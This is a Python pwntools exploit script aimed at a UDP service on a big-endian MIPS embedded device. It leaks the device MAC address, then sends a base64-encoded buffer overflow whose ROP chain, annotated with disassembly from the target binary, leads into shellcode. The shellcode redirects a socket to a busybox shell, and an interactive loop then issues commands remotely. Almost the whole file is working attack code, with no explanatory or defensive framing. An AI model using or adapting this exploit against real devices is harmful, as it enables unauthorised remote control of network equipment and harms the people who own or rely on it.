#!/usr/bin/env python3

import sys
import socket
from pwn import *
context(os='linux', arch='mips', endian='big', log_level='debug')

IP = sys.argv[1]
PORT = int(sys.argv[2])

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

header1 = b"FIVI"
header1+= b"\x00\x00\x00\x00"
header1+= b"\x0A\x01\x00\x00"
header1+= b"\x00\x00\x00\x00"
header1+= b"\x00"
header1+= b"\xFF\xFF\xFF\xFF\xFF\xFF"
header1+= b"\x00\x00"
header1+= b"\x00\x00\x00\x00"

payload = header1

s.sendto(payload, (IP, PORT))
data, addr = s.recvfrom(1024)

if(len(data) == 0x21d):
	mac = data[0x11:0x17]
	print(mac)
else:
	print("[-] recv error")

header2 = b"FIVI"
header2+= b"\x00\x00\x00\x00"
header2+= b"\x0A\x02\x00\x00"
header2+= b"\x00\x00\x00\x00"
header2+= b"\x00"
header2+= mac
header2+= b"\x00\x00"
header2+= b"\x8E\x00\x00\x00"

payload = header2
payload+= b"\x00"*0x40

shellcode = b"\x00"*0x244
shellcode+= b"\xaa\xaa\xaa\xaa" # s0
shellcode+= b"\xbb\xbb\xbb\xbb" # s1
shellcode+= p32(0x00401218)     # ra

'''
.text:00401218                 lw      $gp, 0x9C+var_8C($sp)
.text:0040121C                 la      $t9, close
.text:00401220                 jalr    $t9 ; close
.text:00401224                 move    $a0, $s0         # fd
.text:00401228                 move    $v0, $zero
.text:0040122C
.text:0040122C loc_40122C:                              # CODE XREF: sub_401120+80↑j
.text:0040122C                                          # sub_401120+A0↑j
.text:0040122C                 lw      $ra, 0x9C+var_s8($sp)
.text:00401230                 lw      $s1, 0x9C+var_s4($sp)
.text:00401234                 lw      $s0, 0x9C+var_s0($sp)
.text:00401238                 jr      $ra
.text:0040123C                 addiu   $sp, 0xA8
'''

shellcode+= b"\x00"*0x10
shellcode+= p32(0x0041B030)     # gp
shellcode+= b"\x00"*0x88
shellcode+= b"\xaa\xaa\xaa\xaa" # s0
shellcode+= b"\xbb\xbb\xbb\xbb" # s1
shellcode+= p32(0x00401F98)     # ra

'''
.text:00401F98                 jal     sub_4013D0
.text:00401F9C                 li      $a0, aCanTGetHelloSo  # "Can't get hello socket\n"
.text:00401FA0                 b       loc_4020B4
.text:00401FA4                 nop

.text:004020B4 loc_4020B4:                              # CODE XREF: sub_401DF4+1AC↑j
.text:004020B4                                          # sub_401DF4+238↑j ...
.text:004020B4                 lw      $ra, 0x7C+var_s8($sp)
.text:004020B8                 lw      $s1, 0x7C+var_s4($sp)
.text:004020BC                 lw      $s0, 0x7C+var_s0($sp)
.text:004020C0                 jr      $ra
.text:004020C4                 addiu   $sp, 0x88

.text:004013D0 sub_4013D0:                              # CODE XREF: sub_4013F4+9C↓p
.text:004013D0                                          # sub_4013F4+160↓p ...
.text:004013D0
.text:004013D0 var_8           = -8
.text:004013D0 arg_4           =  4
.text:004013D0 arg_8           =  8
.text:004013D0 arg_C           =  0xC
.text:004013D0
.text:004013D0                 addiu   $sp, -0x10
.text:004013D4                 sw      $a1, 0x10+arg_4($sp)
.text:004013D8                 sw      $a2, 0x10+arg_8($sp)
.text:004013DC                 sw      $a3, 0x10+arg_C($sp)
.text:004013E0                 addiu   $v0, $sp, 0x10+arg_4
.text:004013E4                 sw      $v0, 0x10+var_8($sp)
.text:004013E8                 addiu   $sp, 0x10
.text:004013EC                 jr      $ra
.text:004013F0                 nop
'''

shellcode+= b"\x00"*0x10
shellcode+= b"\x10\x00\x00\x30" # b 0xC4
shellcode+= b"\x00"*0x68
shellcode+= p32(0x00413200-0xd) # s0
shellcode+= b"\xbb\xbb\xbb\xbb" # s1
shellcode+= p32(0x00400C9C)     # ra

#0x00400C9C: lw $gp, 0x10($sp) ; lw $ra, 0x1c($sp) ; jr $ra ; addiu $sp, $sp, 0x20

shellcode+= b"\x00"*0x10
shellcode+= p32(0x0041B030)     # gp
shellcode+= b"\x00"*0x8
shellcode+= p32(0x00400F28)     # ra

'''
.text:00400F28                 sw      $v0, 0xD($s0)
.text:00400F2C
.text:00400F2C loc_400F2C:                              # CODE XREF: sub_400E50+CC↑j
.text:00400F2C                 la      $v0, ifname
.text:00400F30                 lw      $a0, (ifname - 0x413138)($v0)
.text:00400F34                 la      $t9, net_get_hwaddr
.text:00400F38                 jalr    $t9 ; net_get_hwaddr
.text:00400F3C                 addiu   $a1, $s0, 0x11
.text:00400F40                 lw      $ra, 0x20+var_s4($sp)
.text:00400F44                 lw      $s0, 0x20+var_s0($sp)
.text:00400F48                 jr      $ra
.text:00400F4C                 addiu   $sp, 0x28
'''

shellcode+= b"\x00"*0x20
shellcode+= p32(0x00413200)     # s0
shellcode+= p32(0x004027C8)     # ra

'''
.text:004027C0 loc_4027C0:                              # CODE XREF: sub_402790+3C↓j
.text:004027C0                 jalr    $t9
.text:004027C4                 nop
.text:004027C8
.text:004027C8 loc_4027C8:                              # CODE XREF: sub_402790+28↑j
.text:004027C8                 lw      $t9, 0($s0)
.text:004027CC                 bne     $t9, $s1, loc_4027C0
.text:004027D0                 addiu   $s0, -4
.text:004027D4                 lw      $ra, 0x1C+var_s8($sp)
.text:004027D8                 lw      $s1, 0x1C+var_s4($sp)
.text:004027DC                 lw      $s0, 0x1C+var_s0($sp)
.text:004027E0                 jr      $ra
.text:004027E4                 addiu   $sp, 0x28
'''

shellcode+= b"\x00"*0x20

shellcode+= b"\x3C\x1C\x00\x42"        # lui   $gp, 0x42
shellcode+= b"\x27\x9C\xB0\x30"        # addiu $gp, $gp, -0x4fd0
shellcode+= b"\x8F\x82\x80\xB8"        # la      $v0, server_sockfd
shellcode+= b"\x8C\x44\x00\x00"        # lw      $a0, (server_sockfd - 0x413134)($v0)  # fd
shellcode+= b"\x8F\x85\x80\xF4"        # lw $a1, -0x7f0c($gp)
shellcode+= b"\x24\x0c\xff\xef"        # li      t4,-17 ( addrlen = 16 )     
shellcode+= b"\x01\x80\x30\x27"        # nor     a2,t4,zero 
shellcode+= b"\x24\x02\x10\x4a"        # li      v0,4170 ( sys_connect ) 
shellcode+= b"\x01\x01\x01\x0c"        # syscall 0x40404

shellcode+= b"\x3C\x1C\x00\x42"        # lui   $gp, 0x42
shellcode+= b"\x27\x9C\xB0\x30"        # addiu $gp, $gp, -0x4fd0
shellcode+= b"\x8F\x82\x80\xB8"        # la      $v0, server_sockfd
shellcode+= b"\x8C\x44\x00\x00"        # lw      $a0, (server_sockfd - 0x413134)($v0)  # fd  

shellcode+= b"\x24\x0f\xff\xfd"        # li      t7,-3
shellcode+= b"\x01\xe0\x28\x27"        # nor     a1,t7,zero
#shellcode+= b"\x8f\xa4\xff\xff"        # lw      a0,-1(sp)
shellcode+= b"\x24\x02\x0f\xdf"        # li      v0,4063 ( sys_dup2 )
shellcode+= b"\x01\x01\x01\x0c"        # syscall 0x40404
shellcode+= b"\x20\xa5\xff\xff"        # addi    a1,a1,-1
shellcode+= b"\x24\x01\xff\xff"        # li      at,-1
shellcode+= b"\x14\xa1\xff\xfb"        # bne     a1,at, dup2_loop

# execve /bin/busybox sh
shellcode+= b"\x28\x06\xFF\xFF"        # slti    $a2, $zero, -1
shellcode+= b"\x3C\x0F\x2F\x62"        # lui     $t7, 0x2f62
shellcode+= b"\x35\xEF\x69\x6E"        # ori     $t7, $t7, 0x696e
shellcode+= b"\xAF\xAF\xFF\xDC"        # sw      $t7, -0x24($sp)
shellcode+= b"\x3C\x0F\x2F\x62"        # lui     $t7, 0x2f62
shellcode+= b"\x35\xEF\x75\x73"        # ori     $t7, $t7, 0x7573
shellcode+= b"\xAF\xAF\xFF\xE0"        # sw      $t7, -0x20($sp)
shellcode+= b"\x3C\x0F\x79\x62"        # lui     $t7, 0x7962
shellcode+= b"\x35\xEF\x6F\x78"        # ori     $t7, $t7, 0x6f78
shellcode+= b"\xAF\xAF\xFF\xE4"        # sw      $t7, -0x1c($sp)
shellcode+= b"\xAF\xA0\xFF\xE8"        # sw      $zero, -0x18($sp)
shellcode+= b"\x3C\x0F\x73\x68"        # lui     $t7, 0x7368
shellcode+= b"\xAF\xAF\xFF\xEC"        # sw      $t7, -0x14($sp)
shellcode+= b"\xAF\xA0\xFF\xF0"        # sw      $zero, -0x10($sp)
shellcode+= b"\x27\xAF\xFF\xDC"        # addiu   $t7, $sp, -0x24
shellcode+= b"\xAF\xAF\xFF\xF4"        # sw      $t7, -0xc($sp)
shellcode+= b"\x27\xAF\xFF\xEC"        # addiu   $t7, $sp, -0x14
shellcode+= b"\xAF\xAF\xFF\xF8"        # sw      $t7, -8($sp)
shellcode+= b"\xAF\xA0\xFF\xFC"        # sw      $zero, -4($sp)
shellcode+= b"\x27\xA4\xFF\xDC"        # addiu   $a0, $sp, -0x24
shellcode+= b"\x27\xA5\xFF\xF8"        # addiu   $a1, $sp, -8
shellcode+= b"\x24\x02\x0F\xAB"        # addiu   $v0, $zero, 0xfab
shellcode+= b"\x01\x01\x01\x0C"        # syscall 0x40404

payload+= base64.b64encode(shellcode)

s.sendto(payload, (IP, PORT))

while True:
	command = input("shell # ")
	if not command:
		continue
	if "exit" in command:
		s.close()
		break
	command += "\n"
	s.sendto(command.encode(), (IP, PORT))
	data, addr = s.recvfrom(4096)
	print(data.decode())

